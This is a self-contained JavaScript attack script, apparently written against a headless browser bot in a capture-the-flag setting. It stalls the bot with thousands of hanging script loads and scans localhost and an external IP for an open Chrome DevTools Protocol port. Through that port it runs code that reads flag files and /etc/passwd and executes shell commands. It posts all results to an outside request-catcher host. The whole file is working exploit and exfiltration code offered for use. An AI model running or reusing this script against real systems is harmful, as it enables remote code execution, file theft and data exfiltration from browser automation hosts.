(function() {
    'use strict';
    
    const SERVER = 'https://aab.requestcatcher.com';
    
    // =================================================================
    // UTILITY - Send data as readable text
    // =================================================================
    
    function send(endpoint, data) {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/' + endpoint, true);
        xhr.setRequestHeader('Content-Type', 'text/plain');
        xhr.send(data); // Send as plain text, not base64!
    }
    
    function log(msg) {
        send('log', '[' + new Date().toISOString() + '] ' + msg);
        console.log('[EXFIL]', msg);
    }
    
    // =================================================================
    // HOLD THE BOT - Keep page loading forever
    // =================================================================
    
    function holdBot() {
        log('Adding hanging resources to hold bot...');
        
        for (let i = 0; i < 9000; i++) {
            const script = document.createElement('script');
            script.src = 'https://httpstat.us/200?sleep=999999&t=js' + i;
            document.head.appendChild(script);
        }
        
        
        log('Bot is now HELD - page.goto() will never resolve');
    }
    
    holdBot();
  function checkGDP() {
        log('Checking for Chrome DevTools Protocol...');
        
        //const ports = [9222, 9223, 9224, 9229];
      
        
        for (let port = 9000; port <= 10000; port++) {
            fetch(`http://34.78.15.179:${port}/json`)
                .then(r => r.json())
                .then(data => {
                    const output = `
========================================
CDP FOUND!
PORT: ${port}
TABS: ${data.length}
========================================
${JSON.stringify(data, null, 2)}
========================================

WEBSOCKET URL: ${data[0]?.webSocketDebuggerUrl || 'N/A'}
`;
                    send('cdp-found-port-' + port, output);
                    log('✓ CDP FOUND on port ' + port + '!');
                    
                    // Try to exploit CDP
                    exploitCDP(port, data);
                })
                .catch((e) => {
                    // Silent fail - port not open
                  send('cdp-found-port-' + port, e.message);
                });
        }
    }
    
    
    
    // =================================================================
    // 3. CHECK FOR CHROME DEVTOOLS PROTOCOL (CDP)
    // =================================================================
    
    function checkCDP() {
        log('Checking for Chrome DevTools Protocol...');
        
        //const ports = [9222, 9223, 9224, 9229];
      
        
        for (let port = 0; port <= 65535; port++) {
            fetch(`http://localhost:${port}/json`)
                .then(r => r.json())
                .then(data => {
                    const output = `
========================================
CDP FOUND!
PORT: ${port}
TABS: ${data.length}
========================================
${JSON.stringify(data, null, 2)}
========================================

WEBSOCKET URL: ${data[0]?.webSocketDebuggerUrl || 'N/A'}
`;
                    send('cdp-found-port-' + port, output);
                    log('✓ CDP FOUND on port ' + port + '!');
                    
                    // Try to exploit CDP
                    exploitCDP(port, data);
                })
                .catch((e) => {
                    // Silent fail - port not open
                  send('cdp-found-port-' + port, e.message);
                });
        }
    }
    
    //setTimeout(checkGDP, 500);
  setTimeout(checkCDP, 100);
  holdBot();
    
    // =================================================================
    // 4. EXPLOIT CDP FOR RCE (if available)
    // =================================================================

    
    function exploitCDP(port, tabs) {
        if (!tabs || tabs.length === 0) return;
        
        const wsUrl = tabs[0].webSocketDebuggerUrl;
        if (!wsUrl) return;
        
        log('Attempting CDP exploitation via WebSocket...');
        
        try {
            const ws = new WebSocket(wsUrl);
            
            ws.onopen = () => {
                log('✓ CDP WebSocket connected!');
                
                // Execute Node.js code to read files
                const commands = [
                    {
                        id: 1,
                        method: 'Runtime.evaluate',
                        params: {
                            expression: `require('fs').readFileSync('/flag.txt', 'utf8')`
                        }
                    },
                  {
                        id: 2,
                        method: 'Runtime.evaluate',
                        params: {
                            expression: `require('fs').readFileSync('/app/flag.txt', 'utf8')`
                        }
                    },
                  {
                        id: 3,
                        method: 'Runtime.evaluate',
                        params: {
                            expression: `require('fs').readFileSync('../flag.txt', 'utf8')`
                        }
                    },
                    {
                        id: 4,
                        method: 'Runtime.evaluate',
                        params: {
                            expression: `require('fs').readFileSync('/etc/passwd', 'utf8')`
                        }
                    },
                    {
                        id: 5,
                        method: 'Runtime.evaluate',
                        params: {
                            expression: `require('child_process').execSync('ls -la /app').toString()`
                        }
                    },
                    {
                        id: 6,
                        method: 'Runtime.evaluate',
                        params: {
                            expression: `require('child_process').execSync('whoami').toString()`
                        }
                    }
                ];
                
                commands.forEach((cmd, i) => {
                    setTimeout(() => {
                        ws.send(JSON.stringify(cmd));
                        log('Sent CDP command #' + cmd.id);
                    }, i * 500);
                });
            };
            
            ws.onmessage = (event) => {
                const response = JSON.parse(event.data);
                
                if (response.result && response.result.result) {
                    const value = response.result.result.value;
                    const output = `
========================================
CDP RCE RESULT
COMMAND ID: ${response.id}
========================================
${value}
========================================
`;
                    send('cdp-rce-' + response.id, output);
                    log('✓ CDP RCE result received for command #' + response.id);
                }
            };
            
            ws.onerror = (e) => {
                log('✗ CDP WebSocket error: ' + e.message);
            };
            
        } catch(e) {
            log('✗ CDP exploitation failed: ' + e.message);
        }
    }
    
    
    // =================================================================
    // 6. HEARTBEAT (every 60 seconds, not spammy)
    // =================================================================
    
    let heartbeat = 0;
    setInterval(() => {
        heartbeat++;
        send('heartbeat', `Heartbeat #${heartbeat} - Bot still alive at ${new Date().toISOString()}`);
        log('Heartbeat #' + heartbeat);
    }, 60000); // 1 minute intervals
  holdBot();
    
    
    log('Exfiltration script initialized successfully');
    
})();
